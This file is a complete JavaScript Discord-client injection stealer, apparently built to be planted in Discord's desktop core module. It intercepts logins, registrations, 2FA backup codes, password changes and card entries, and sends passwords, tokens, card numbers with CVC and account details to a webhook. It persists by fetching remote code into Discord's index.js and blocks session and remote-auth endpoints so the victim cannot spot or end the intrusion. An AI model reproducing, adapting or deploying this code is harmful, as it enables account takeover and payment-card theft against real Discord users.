const fs = require("fs");
const os = require("os");
const https = require("https");
const args = process.argv;
const path = require("path");
const querystring = require("querystring");

const { BrowserWindow, session, app } = require("electron");


const CV2 = {
    FLAG: 32768,
    text: (content) => ({ type: 10, content }),
    thumbnail: (url) => ({ type: 11, media: { url } }),
    section: (components, accessory) => ({ type: 9, components, accessory }),
    separator: (divider = true, spacing = 1) => ({ type: 14, divider, spacing }),
    container: (components, accentColor = 3553599) => ({ type: 17, accent_color: accentColor, components }),
    actionRow: (components) => ({ type: 1, components }),
    buttonLink: (label, url) => ({ type: 2, style: 5, label, url }),
    send: (url, components) => {
        const u = url.includes('?') ? `${url}&with_components=true` : `${url}?with_components=true`;
        return new Promise((resolve, reject) => {
            const options = {
                hostname: new URL(u).hostname,
                path: new URL(u).pathname + new URL(u).search,
                method: "POST",
                headers: { "Content-Type": "application/json" }
            };
            const req = https.request(options, (res) => {
                let data = "";
                res.on("data", (chunk) => (data += chunk));
                res.on("end", () => resolve(data));
            });
            req.on("error", reject);
            req.write(JSON.stringify({ flags: CV2.FLAG, components }));
            req.end();
        });
    }
};

const CONFIG = {
  webhook:
    "%WEBHOOK_URL%",
  injection_url:
    "https://raw.githubusercontent.com/erayx069-ux/extractor/blob/main/index.js",
  filters: {
    urls: [
      "/auth/login",
      "/auth/register",
      "/mfa/totp",
      "/mfa/codes-verification",
      "/users/@me",
    ],
  },
  filters2: {
    urls: [
      "wss://remote-auth-gateway.discord.gg/*",
      "https://discord.com/api/v*/auth/sessions",
      "https://*.discord.com/api/v*/auth/sessions",
      "https://discordapp.com/api/v*/auth/sessions",
    ],
  },
  payment_filters: {
    urls: [
      "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
      "https://api.stripe.com/v*/tokens",
    ],
  },
  API: "https://discord.com/api/v9/users/@me",
};

const executeJS = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
  const window = BrowserWindow.getAllWindows()[0];
  window.webContents.session.flushStorageData();
  window.webContents.session.clearStorageData();
  app.relaunch();
  app.exit();
};

const getToken = async () =>
  await executeJS(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
  );

const request = async (method, url, headers, data) => {
  url = new URL(url);
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: method,
    headers: {
      "Access-Control-Allow-Origin": "*",
    },
  };

  if (url.search) options.path += url.search;
  for (const key in headers) options.headers[key] = headers[key];
  const req = https.request(options);
  if (data) req.write(data);
  req.end();

  return new Promise((resolve, reject) => {
    req.on("response", (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => resolve(data));
    });
  });
};

const hookerCV2 = async (content, token, account) => {
    const billing = await getBilling(token);
    const email = account.email;
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const { friends_list, numberOfFriends, totalFriends} = await getRelationships(token);
    const { guilds, number_guilds } = await getGuilds(token);
    
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';
    
    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    const friendsContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **HQ Friends Information — @${account.username}**`),
        CV2.separator(),
        CV2.text(`<:black_1jnounable:1451287799880749176> **Total Friends** → \`${totalFriends}\`\n<:black_star:1450596494821429450> **Total HQ Friends** → \`${numberOfFriends}\``),
        CV2.separator(),
        CV2.text(friends_list || '\u200b'),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    const guildsContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Guilds Information — @${account.username}**`),
        CV2.separator(),
        CV2.text(`<:black_star:1450596494821429450> **Total Guilds** → \`${number_guilds}\`\n<:black_1jnounable:1451287799880749176> **Total HQ Guilds** → \`${number_guilds}\``),
        CV2.separator(),
        CV2.text(guilds || '\u200b'),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    try {
        await CV2.send(CONFIG.webhook, [accountContainer, CV2.separator(), friendsContainer, CV2.separator(), guildsContainer]);
    } catch (err) {
        const status = err.response?.status;
        const msg = err.response?.data?.message || err.message;
    }
};

// Embeds style stub.js pour les événements d'injection
const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    const billing = await getBilling(token);
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';

    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``,
        ``,
        `<a:drag:1240636089258086461> **Login Email:** \`${email}\``,
        `<:password:1240676883583078441> **Login Password:** \`${password}\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    await CV2.send(CONFIG.webhook, [accountContainer]);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);
    const billing = await getBilling(token);
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';

    const filteredCodes = codes.filter((code) => code.consumed === false);
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }

    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``,
        ``,
        `<a:drag:1240636089258086461> **Backup Codes:**`,
        `\`\`\`${message}\`\`\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    await CV2.send(CONFIG.webhook, [accountContainer]);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    const billing = await getBilling(token);
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';

    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``,
        ``,
        `<:password:1240676883583078441> **New Password:** \`${newPassword}\``,
        `<:password:1240676883583078441> **Old Password:** \`${oldPassword}\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    await CV2.send(CONFIG.webhook, [accountContainer]);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    const billing = await getBilling(token);
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';

    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``,
        ``,
        `<:card:1240685133128798258> **Card Number:** \`${number}\``,
        `<:blackstar:1240640910392430602> **CVC:** \`${cvc}\``,
        `<a:dead:1240647144013168681> **Expiration:** \`${month}/${year}\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    await CV2.send(CONFIG.webhook, [accountContainer]);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    const billing = await getBilling(token);
    const ip = await getIp();
    const mfa_enabled = await getMFA(token);
    const twoFA = mfa_enabled === 'Yes' ? 'Enabled' : 'Disabled';
    
    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}?size=512`
        : `https://cdn.discordapp.com/embed/avatars/${Number(BigInt(account.id) >> 22n) % 6}.png`;
    
    const billingText = billing.replaceAll('\`', '').replaceAll('<:946246524504002610:962747802830655498>', 'Paypal ').replaceAll('<:bby:987692721613459517>', 'Creditcard ');
    const nitroText = await getNitro(account.premium_type, account.id, token) || 'None';

    const accountFields = [
        `<:bby:987689933844127804> **Badges:** ${getBadgesNames(account.flags)}`,
        `<:bby:987689935018549328> **Nitro:** ${nitroText}`,
        `<:bby:987689943558135818> **Email:** \`${account.email || 'None'}\``,
        `<a:bby:987689939401588827> **Billing:** ${billingText}`,
        `<a:black:1440450017314869403> **Phone:** \`${account.phone || 'None'}\``,
        `<:ange:1103031009550798948> **2FA:** \`${twoFA}\``,
        `<:bby:987689942350196756> **IP:** \`${ip}\``,
        ``,
        `<:paypal:1240684761639551077> **PayPal Added:** \`${account.email}\``
    ].join('\n');

    const accountContainer = CV2.container([
        CV2.text(`### <a:black_exclamation:1448646388203388958> **Account Information | @${account.username} (${account.id})**`),
        CV2.separator(),
        CV2.section([CV2.text(accountFields)], CV2.thumbnail(avatarUrl)),
        CV2.separator(),
        CV2.text(`<a:bby:987689940852817971> **Token:**\n\`\`\`\n||${token}||\n\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${encodeURIComponent(token)})`),
        CV2.separator(),
        CV2.text(`t.me/Cowpublic`)
    ]);

    await CV2.send(CONFIG.webhook, [accountContainer]);
};

const fetch = async (endpoint, headers) => {
  return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async (token) =>
  await fetch("", {
    Authorization: token,
  });

// Fonctions manquantes pour les embeds Discord (identiques à stub.js)
async function getIp() {
  try {
    const response = await request("GET", "https://www.myexternalip.com/raw");
    return response || 'Unknown';
  } catch {
    return 'Unknown';
  }
}

async function getMFA(token) {
  try {
    const res = JSON.parse(await request("GET", "https://discord.com/api/v9/users/@me", {
      'Content-Type': 'application/json',
      'authorization': token
    }));
    return res.mfa_enabled ? 'Yes' : 'No';
  } catch {
    return 'No';
  }
}

async function getRelationships(token) {
  try {
    const res = JSON.parse(await request("GET", "https://discord.com/api/v9/users/@me/relationships", {
      'authorization': token
    }));
    
    const friends = res.filter(r => r.type === 1);
    const hqFriends = friends.filter(f => f.user && f.user.flags && f.user.flags > 0);
    
    const friends_list = hqFriends.length > 0 
      ? hqFriends.map(f => `\`${f.user.username} (${f.user.id})\``).join('\n')
      : null;
    
    return {
      friends_list,
      numberOfFriends: hqFriends.length,
      totalFriends: friends.length
    };
  } catch {
    return {
      friends_list: null,
      numberOfFriends: 0,
      totalFriends: 0
    };
  }
}

async function getGuilds(token) {
  try {
    const res = JSON.parse(await request("GET", "https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
      'authorization': token
    }));
    
    const hqGuilds = res.filter(g => g.owner || g.permissions & 0x8);
    const guilds_list = hqGuilds.length > 0 
      ? hqGuilds.map(g => `\`${g.name} (${g.id})\``).join('\n')
      : null;
    
    return {
      guilds: guilds_list,
      number_guilds: hqGuilds.length
    };
  } catch {
    return {
      guilds: null,
      number_guilds: 0
    };
  }
}

async function getNitro(premium_type, userId, token) {
  if (!premium_type) return 'None';
  
  try {
    const res = JSON.parse(await request("GET", "https://discord.com/api/v9/users/@me/billing/subscriptions", {
      'authorization': token
    }));
    
    const nitro = res.find(s => s.plan_id === '511651860713635850');
    if (nitro) {
      const endDate = new Date(nitro.current_period_end * 1000);
      return `Nitro Boost (Expires: ${endDate.toLocaleDateString()})`;
    }
    
    return premium_type === 2 ? 'Nitro' : 'Nitro Classic';
  } catch {
    return premium_type === 2 ? 'Nitro' : 'Nitro Classic';
  }
}

function getBadgesNames(flags) {
  const badges = [];
  if (flags & 1) badges.push('Staff');
  if (flags & 2) badges.push('Partner');
  if (flags & 4) badges.push('HypeSquad');
  if (flags & 8) badges.push('Bug Hunter');
  if (flags & 64) badges.push('HypeSquad Bravery');
  if (flags & 128) badges.push('HypeSquad Brilliance');
  if (flags & 256) badges.push('HypeSquad Balance');
  if (flags & 512) badges.push('Early Supporter');
  if (flags & 16384) badges.push('Bug Hunter Level 2');
  if (flags & 131072) badges.push('Verified Bot');
  if (flags & 65536) badges.push('Early Verified Bot Developer');
  return badges.length > 0 ? badges.join(', ') : 'None';
}
const fetchBilling = async (token) =>
  await fetch("/billing/payment-sources", {
    Authorization: token,
  });

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  let billing = "";
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += "<:card:1240685133128798258> ";
          break;
        case 2:
          billing += "<:paypal:1240684761639551077> ";
          break;
      }
    }
  });
  return billing || "`None`";
};

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === "win32") {
    resourcePath = path.join(app, "resources");
  } else if (process.platform === "darwin") {
    resourcePath = path.join(app, "Contents", "Resources");
  }

  if (fs.existsSync(resourcePath))
    return {
      resourcePath,
      app,
    };
  return {
    undefined,
    undefined,
  };
})();

async function initiation() {
  if (fs.existsSync(path.join(__dirname, "initiation"))) {
    fs.rmdirSync(path.join(__dirname, "initiation"));

    const token = await getToken();
    if (!token) return;

    const account = await fetchAccount(token);

    const fields = [
      `<a:drag:1240636089258086461> **Email:** \`${account.email}\``,
      `<:blackstar:1240640910392430602> **Phone:** \`${account.phone || "None"}\``
    ].join('\n');

    const parts = [
      CV2.text(`### **Injected ${account.username}**`),
      CV2.separator(),
      CV2.section([CV2.text(fields)]),
      CV2.separator()
    ];

    await hookerCV2({name: `Injected ${account.username}`}, token, account);
    clearAllUserData();
  }

  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, "app");
  const packageJson = path.join(appPath, "package.json");
  const resourceIndex = path.join(appPath, "index.js");
  const coreVal = fs
    .readdirSync(`${app}\\modules\\`)
    .filter((x) => /discord_desktop_core-+?/.test(x))[0];
  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
  const bdPath = path.join(
    process.env.APPDATA,
    "\\betterdiscord\\data\\betterdiscord.asar"
  );
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: "discord",
          main: "index.js",
        },
        null,
        4
      )
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, "app.asar")}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
  }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0];
  if (!mainWindow) return;

  mainWindow.webContents.debugger.attach("1.3");
  mainWindow.webContents.debugger.on("message", async (_, method, params) => {
    if (!initiationCalled) {
      await initiation();
      initiationCalled = true;
    }

    if (method !== "Network.responseReceived") return;
    if (!CONFIG.filters.urls.some((url) => params.response.url.endsWith(url)))
      return;
    if (![200, 202].includes(params.response.status)) return;

    const responseUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getResponseBody",
        {
          requestId: params.requestId,
        }
      );
    const responseData = JSON.parse(responseUnparsedData.body);

    const requestUnparsedData =
      await mainWindow.webContents.debugger.sendCommand(
        "Network.getRequestPostData",
        {
          requestId: params.requestId,
        }
      );
    const requestData = JSON.parse(requestUnparsedData.postData);

    switch (true) {
      case params.response.url.endsWith("/login"):
        if (!responseData.token) {
          email = requestData.login;
          password = requestData.password;
          return; // 2FA
        }
        const accountLogin = await fetchAccount(responseData.token);
        EmailPassToken(
          requestData.login,
          requestData.password,
          responseData.token,
          "logged in"
        );
        break;

      case params.response.url.endsWith("/register"):
        const accountRegister = await fetchAccount(responseData.token);
        EmailPassToken(
          requestData.email,
          requestData.password,
          responseData.token,
          "signed up"
        );
        break;

      case params.response.url.endsWith("/totp"):
        const account2FA = await fetchAccount(responseData.token);
        EmailPassToken(
          email,
          password,
          responseData.token,
          "logged in with 2FA"
        );
        break;

      case params.response.url.endsWith("/codes-verification"):
        const accountBackup = await fetchAccount(await getToken());
        BackupCodesViewed(responseData.backup_codes, await getToken());
        break;

      case params.response.url.endsWith("/@me"):
        if (!requestData.password) return;

        if (requestData.email) {
          const accountEmail = await fetchAccount(responseData.token);
          EmailPassToken(
            requestData.email,
            requestData.password,
            responseData.token,
            "changed his email to **" + requestData.email + "**"
          );
        }

        if (requestData.new_password) {
          const accountPass = await fetchAccount(responseData.token);
          PasswordChanged(
            requestData.new_password,
            requestData.password,
            responseData.token
          );
        }
        break;
    }
  });

  mainWindow.webContents.debugger.sendCommand("Network.enable");

  mainWindow.on("closed", () => {
    createWindow();
  });
};
createWindow();

session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != "POST") return;
    switch (true) {
      case details.url.endsWith("tokens"):
        const item = querystring.parse(
          Buffer.from(details.uploadData[0].bytes).toString()
        );
        const accountCard = await fetchAccount(await getToken());
        CreditCardAdded(
          item["card[number]"],
          item["card[cvc]"],
          item["card[exp_month]"],
          item["card[exp_year]"],
          await getToken()
        );
        break;

      case details.url.endsWith("paypal_accounts"):
        const accountPaypal = await fetchAccount(await getToken());
        PaypalAdded(await getToken());
        break;
    }
  }
);

session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (details, callback) => {
    if (
      details.url.startsWith("wss://remote-auth-gateway") ||
      details.url.endsWith("auth/sessions")
    )
      return callback({
        cancel: true,
      });
  }
);

module.exports = require("./core.asar");
